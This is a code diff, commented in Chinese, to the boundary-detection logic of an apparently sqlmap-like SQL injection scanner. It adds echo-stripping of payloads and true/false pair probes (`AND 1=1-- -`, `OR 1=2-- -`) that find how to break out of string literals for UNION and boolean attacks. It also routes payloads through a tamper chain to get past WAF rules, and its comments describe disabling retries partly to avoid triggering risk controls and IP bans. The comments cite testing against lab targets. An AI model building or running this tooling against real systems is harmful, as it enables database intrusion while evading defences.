@@ -1,6 +1,8 @@
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
 import { chunkSimilarity, chunkHashes, dynamicBlockFilter } from '../core/statsHelper.js';
 import { buildInjectionRequest } from './injection.js';
+// [ECHO-FIX 2026-09-18] 闭合探测的相似判定需剔除被回显的 payload（见 probeBoundary 内注释）
+import { stripEchoedPayload } from './echoStrip.js';
 // [P0-FIX 2026-09-11] WAF 拦截页判定（布尔真假对防误报）：复用统一拦截签名识别
 import { detectGenericBlock } from '../core/waf/blockSignatures.js';
 // [P0-FIX 2026-09-09] 出口选项同源（send / sendHead 与 sendInjection 共用一个构造器）
@@ -125,25 +127,78 @@ export class Detector {
       const baseStatus = baseRes?.status ?? null;
       // 首请求自动学习页面特征：提取 <title> 供后续 matchTitle 使用
       point._baselineTitle = this._extractTitle(baseBody);
+      // [ECHO-FIX 2026-09-18] 相似判定必须先剔除「被回显的 payload 自身」。
+      // 目标把注入值原样打回页面（`sql=…` 调试回显 / 报错页回显请求 URL）时，正确闭合的响应
+      // 比基线**恰好长出 payload 那几个字节**——差异全来自回显文本，与结果集无关。
+      // 不剔除的后果不是"判不准"而是"一个候选都不命中"：实测 blackbox-lab 真 MySQL 的 LIKE
+      // 搜索框（`WHERE name LIKE '%${kw}%'`，需 `%'` 闭合）13 个候选全部判不相似 →
+      // boundary 回退 '' → union 门控与列数二分全落在字符串字面量内 →
+      // union 技术位恒 0、列数猜到上限 50（echoStrip.js 文件头那个坑的第 ④ 个实例）。
+      const baseClean = stripEchoedPayload(baseBody, orig);
+      /**
+       * @param {string} body 候选闭合探针的响应体
+       * @param {any} status 候选闭合探针的状态码
+       * @param {string} payload 本候选实发 payload（用于剔除回显）
+       */
+      const similar = (body, status, payload) =>
+        this._boundarySimilar(baseClean, baseStatus, stripEchoedPayload(body, payload), status, config);
       // 并行探测 8 个闭合候选（原串行，独立请求可并发）
+      // [OPS-FIX 2026-09-18] 闭合探测一律 **不重试**：这些探针里有的会让目标直接挂住
+      // （实测某 Express 靶场对 Cookie 值做 `decodeURIComponent`，收到 `%'` 这类非法转义序列
+      // 就在 async handler 里抛 URIError → Promise 无人 catch → 该连接永不应答）。
+      // 默认 retry=3 + timeoutMs=30s 意味着一个候选吃掉 4×30s，13 个并发候选一起挂住时，
+      // 单个注入点的闭合探测就能拖过 2 分钟，而且**重复发送同一攻击特征**正是风控/封 IP 的
+      // 触发点。挂住的探针重发大概率还是挂（服务端缺陷不是一次性网络抖动），故此处只发一次；
+      // 真·网络抖动的兜底本来就在上层（validity.failStreak / dbHealthGuard）。
+      const PROBE_OPTS = { retry: 0 };
       const results = await Promise.allSettled(
         candidates.map((prefix) => {
           // [P2-FIX 2026-09-09] 探测 payload 过 tamper 链：WAF 场景下 `-- -` 是 4 连非词字符
           // （CRS 942460 必拦），闭合探测全被拦时 str/like 场景拿不到 boundary → 布尔对必漏。
           // 与 BooleanBlindDetector boundary 对同样走 obfuscateValue，保持投放语义一致。
           const payload = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
-          return this.send(httpClient, ctx, this.buildRequest(target, point, payload), ctx)
-            .then((r) => ({ prefix, body: String(r?.data ?? ''), status: r?.status }));
+          return this.send(httpClient, ctx, this.buildRequest(target, point, payload), PROBE_OPTS)
+            .then((r) => ({ prefix, body: String(r?.data ?? ''), status: r?.status, payload }));
         })
       );
       // JSDoc 断言：上面的 filter 已保证 fulfilled，但 TS 无法从回调里收窄，
       // 收窄后下方 `r.value` / `hit.value` 的访问才是类型安全的（运行时语义不变）。
-      const similarHits = /** @type {PromiseFulfilledResult<{ prefix: string; body: string; status: any }>[]} */ (
+      const similarHits = /** @type {PromiseFulfilledResult<{ prefix: string; body: string; status: any; payload: string }>[]} */ (
         results.filter(
-          (r) => r.status === 'fulfilled' && this._boundarySimilar(baseBody, baseStatus, r.value.body, r.value.status, config)
+          (r) => r.status === 'fulfilled' && similar(r.value.body, r.value.status, r.value.payload)
         )
       );
       const hit = similarHits[0];
+      // [PAIR-FIX 2026-09-18] 「与基线比对」这条判据在**回显型目标**上会一个候选都不命中：
+      // 基线页里也含被注入的值（`sql=…` 调试回显 / 报错页回显 URL），剔除回显时既剔掉 SQL 文本里
+      // 的那份、也剔掉**结果行里**的那份（实测 `1 | Mechanical Keyboard` 被剔成 `Mechanical  `），
+      // 于是真闭合的响应与基线永远差着几个字符 → 13 个候选全部落空 → boundary='' →
+      // union 门控/列数二分整句落进字符串字面量 → 该点的 union+boolean 技术位全灭
+      // （实测 blackbox-lab 真 MySQL 的 LIKE 搜索框 `/api/like?q=`，需 `%'` 或 `'` 闭合）。
+      // 换一条**不依赖基线**的判据：等长真假对差分。
+      //   `AND 1=1` 与 `AND 1=2` 长度相同（回显增量也相同），各自剔除自己的 payload 后：
+      //   · 闭合正确 → 真页有结果集、假页无 → 两侧显著不同；
+      //   · 闭合错误 → 两侧同样落进字面量内或同样语法报错 → 剔除回显后逐字相同。
+      // 强动态页不会因此假命中：噪声让两侧「相似」而不是「不同」，判据方向正好相反。
+      // 成本：仅在基线比对一条候选都没命中时才发（正常站点零额外请求）。
+      if (similarHits.length === 0) {
+        const pairHits = await Promise.allSettled(
+          candidates.map(async (prefix) => {
+            const tp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=1-- -`);
+            const fp = this.obfuscateValue(ctx, `${orig}${prefix} AND 1=2-- -`);
+            const [t, f] = await Promise.all([
+              this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS),
+              this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS),
+            ]);
+            const tc = stripEchoedPayload(String(t?.data ?? ''), tp);
+            const fc = stripEchoedPayload(String(f?.data ?? ''), fp);
+            // 两侧都空（如全程 404）不构成信号
+            return { prefix, ok: tc.length > 0 && !this.chunkedSimilar(tc, fc) };
+          })
+        );
+        const bestPair = /** @type {any} */ (pairHits.find((r) => r.status === 'fulfilled' && r.value.ok));
+        if (bestPair) return bestPair.value.prefix;
+      }
       // [P1-FIX 2026-09-10 实战实测] 空基线下的闭合前缀歧义消解：
       // 参数**原值查不到行**时（实测 UA 头注入 `WHERE username='Mozilla'` 恒 0 行），**所有**候选
       // 闭合前缀都落在同一个空结果页 → 全部「相似于基线」→ 原实现取第一个即空前缀 `''` →
@@ -162,13 +217,15 @@ export class Detector {
         const probes = await Promise.allSettled(
           similarHits.slice(0, RECHECK_MAX).map(async (s) => {
             const p = s.value.prefix;
-            const t = await this.send(httpClient, ctx, this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${p} OR 1=1-- -`)), ctx);
-            const f = await this.send(httpClient, ctx, this.buildRequest(target, point, this.obfuscateValue(ctx, `${orig}${p} OR 1=2-- -`)), ctx);
+            const tp = this.obfuscateValue(ctx, `${orig}${p} OR 1=1-- -`);
+            const fp = this.obfuscateValue(ctx, `${orig}${p} OR 1=2-- -`);
+            const t = await this.send(httpClient, ctx, this.buildRequest(target, point, tp), PROBE_OPTS);
+            const f = await this.send(httpClient, ctx, this.buildRequest(target, point, fp), PROBE_OPTS);
             return {
               prefix: p,
               ok:
-                !this._boundarySimilar(baseBody, baseStatus, String(t?.data ?? ''), t?.status, config) &&
-                this._boundarySimilar(baseBody, baseStatus, String(f?.data ?? ''), f?.status, config),
+                !similar(String(t?.data ?? ''), t?.status, tp) &&
+                similar(String(f?.data ?? ''), f?.status, fp),
             };
           })
         );
